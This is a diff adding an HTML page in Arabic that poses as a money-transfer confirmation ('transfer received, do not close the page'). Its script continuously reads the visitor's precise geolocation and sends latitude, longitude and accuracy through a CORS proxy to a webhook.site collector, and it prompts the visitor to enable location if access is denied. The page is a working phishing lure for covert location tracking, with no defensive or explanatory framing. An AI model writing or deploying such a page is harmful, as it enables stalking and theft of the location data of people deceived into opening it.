@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>استلام حوالة مالية</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 100px;
+      background-color: #f0f0f0;
+    }
+    h2 {
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <h2>✅ تم استلام الحوالة</h2>
+  <p>جاري تحديث موقعك لحظيًا... لا تغلق الصفحة</p>
+
+  <script>
+    const proxyURL = "https://corsproxy.io/?";
+    const destination = encodeURIComponent("https://webhook.site/2f41947c-0e64-4f3c-8cac-27814d28743b");
+
+    if ("geolocation" in navigator) {
+      navigator.geolocation.watchPosition(
+        function(position) {
+          const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+          };
+
+          fetch(proxyURL + destination, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+          });
+        },
+        function(error) {
+          document.body.innerHTML = "<h2>فشل في تحديد الموقع ❌</h2><p>يرجى تفعيل الموقع الجغرافي.</p>";
+        },
+        {
+          enableHighAccuracy: true,
+          maximumAge: 0,
+          timeout: 5000
+        }
+      );
+    } else {
+      document.body.innerHTML = "<h2>المتصفح لا يدعم تحديد الموقع.</h2>";
+    }
+  </script>
+</body>
+</html>
